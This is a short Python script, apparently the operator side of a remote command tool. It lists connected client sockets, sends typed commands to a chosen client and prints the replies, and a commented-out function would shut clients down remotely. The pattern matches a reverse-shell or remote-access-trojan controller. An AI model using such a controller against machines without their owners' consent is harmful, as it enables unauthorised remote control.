import sys
# our menu
def menu():
    print("""SERVER MANAGER
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    1) show all clients
    2) excute comand on client
    3) excute comand on all clients
    """)
def print_all_clients(clients):
    counter=0
    for client in clients:
        print("{}) {}".format(counter, client[1]))
        counter=counter+1

#function command will give you list of all clients and will allow you run command on one of them
def command(clients,client=None,cmd:str=None):
    if clients:
        try:
            #if we have cmd we have client
            comand_to_excute=cmd
            #if we don't have client we will pick him and will get the comand
            if not client:
                print_all_clients(clients)
                client_id=int(input("[+] Select client to run command: "))
                client=clients[client_id]
                comand_to_excute=input("[+] enter command to excute: ")
            client_socket=client[0]
            error: ConnectedAbortedError=None
            error=client_socket.sendall(comand_to_excute.encode())
            if comand_to_excute=="exit":
                clients.remove(clients[client_id])
                return
            res=client_socket.recv(2048).decode()
            print(client[1][0],res)
        except (Exception) as e:
            if e.__class__.__name__ =='ValueError':
                print(e)
            elif e.__class__.__name__ =='ConnectionAbortedError':
                clients.remove(clients[client_id])
            else:
                print(e.__class__.__name__)

    else:
        print("no clients")

# this function will print you all clients and will allow you shotdown 1 or all of them, this need run as maanger in client side, so I set it under notes
#def shout_down(clients,client=None):
#    if clients:
#        if not client:
#            print_all_clients(clients)
#            client_id=int(input("[+] Select client to run command"))
#            client=clients[client_id]
#        client_socket=client[0]
#        comand_to_excute="shutdown /s"
#        client_socket.sendall(comand_to_excute.encode())
#    else:
#        print("no clients")

